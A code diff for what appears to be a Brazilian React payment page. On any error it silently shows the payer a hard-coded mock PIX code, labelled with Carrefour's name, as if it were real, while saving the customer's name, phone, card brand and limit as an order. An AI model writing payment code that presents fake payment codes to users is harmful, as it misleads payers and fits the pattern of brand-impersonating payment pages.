@@ -256,18 +256,23 @@ export default function PaymentPage() {
     } catch (error) {
       console.error('Erro ao gerar PIX:', error);
       // Sempre usar mock em caso de erro para garantir que os elementos apareçam
-      console.warn('Usando PIX mock devido ao erro');
+      console.warn('Usando PIX mock devido ao erro:', error.message);
+      
       const mockResult = {
-        transactionId: 'TXN' + Date.now(),
+        transactionId: 'TXN' + Date.now() + Math.random().toString(36).substr(2, 9).toUpperCase(),
         pixCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
         qrCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
         expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString()
       };
-      console.log('Usando PIX mock devido ao erro');
+      
+      console.log('Aplicando PIX mock...');
       setPixData(mockResult.pixCode, mockResult.qrCode, mockResult.transactionId);
       setPixGerado(true);
       setTempoRestante(5 * 60);
+      setLoading(false);
+      
       console.log('Estado atualizado (mock): pixGerado=true, pixCode=', mockResult.pixCode?.substring(0, 20));
+      
       localStorage.setItem('pix_data', JSON.stringify({
         pixCode: mockResult.pixCode,
         pixQrCode: mockResult.qrCode,
@@ -277,6 +282,7 @@ export default function PaymentPage() {
       }));
       
       // Salvar pedido mock no admin store
+      console.log('Salvando pedido no admin store...');
       addOrder({
         nomeCompleto,
         telefone,
@@ -297,7 +303,22 @@ export default function PaymentPage() {
         bandeiraCartao,
         limite,
       });
+      
+      // Enviar notificação de pedido pendente (apenas uma vez)
+      if (!notificacaoPendenteEnviadaRef.current) {
+        console.log('Enviando notificação de pedido pendente...');
+        try {
+          await notificarPedidoPendente(mockResult.transactionId, dadosPix.amount);
+          notificacaoPendenteEnviadaRef.current = true;
+          console.log('Notificação enviada com sucesso');
+        } catch (notifError) {
+          console.error('Erro ao enviar notificação de pedido pendente:', notifError);
+        }
+      }
+      
+      console.log('PIX mock aplicado com sucesso');
     } finally {
+      console.log('Finalizando geração de PIX, limpando loading...');
       setLoading(false);
       gerandoPixRef.current = false;
     }
